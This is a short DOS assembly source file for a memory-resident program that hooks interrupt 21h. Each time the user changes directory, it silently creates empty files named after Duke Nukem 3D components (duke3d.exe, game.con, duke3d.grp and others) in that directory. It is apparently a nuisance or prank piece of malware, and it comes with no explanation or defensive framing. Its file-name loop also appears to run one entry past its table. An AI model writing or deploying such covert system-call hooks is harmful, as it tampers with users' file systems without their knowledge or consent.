.model tiny
.code
.startup

jmp star

kur proc
 cmp ah,3bh
je n

 jmp dword ptr cs:i
n:

 pushf
call dword ptr cs:i
jc e

 push dx
 push cx
 push bx
 push ax
 push ds
 
 xor cx,cx
 mov ax,cs
 mov ds,ax
 xor bx,bx

cikl:

 mov dx,offset nam
 add dx,bx
 push bx

 mov ah,5bh
 pushf
call dword ptr cs:i

 mov bx,ax

 mov ah,3eh
 pushf
call dword ptr cs:i

 pop bx
 add bx,0dh
 cmp bx,0b6h
jbe cikl

 pop ds
 pop ax
 pop bx
 pop cx
 pop dx
 
e:
 clc
 iret

nam db 'duke3d.cfg',0,0,0
    db 'defs.con',0,0,0,0,0
    db 'game.con',0,0,0,0,0
    db 'user.con',0,0,0,0,0
    db 'commit.dat',0,0,0
    db 'commit.exe',0,0,0
    db 'duke3d.exe',0,0,0
    db 'setmain.exe',0,0
    db 'setup.exe',0,0,0,0
    db 'duke3d.grp',0,0,0
    db 'tengame.ini',0,0
    db 'ultramid.ini',0
    db 'modem.pck',0,0,0,0
    db 'duke.rts',0,0,0,0,0

i dw 0h
c dw 0h
kur endp

star:

 mov ah,35h
 mov al,21h
 int 21h
 mov c,es
 mov i,bx

 mov ah,25h
 mov al,21h
 mov dx,offset kur
 int 21h

 mov dx,201h
 int 27h

end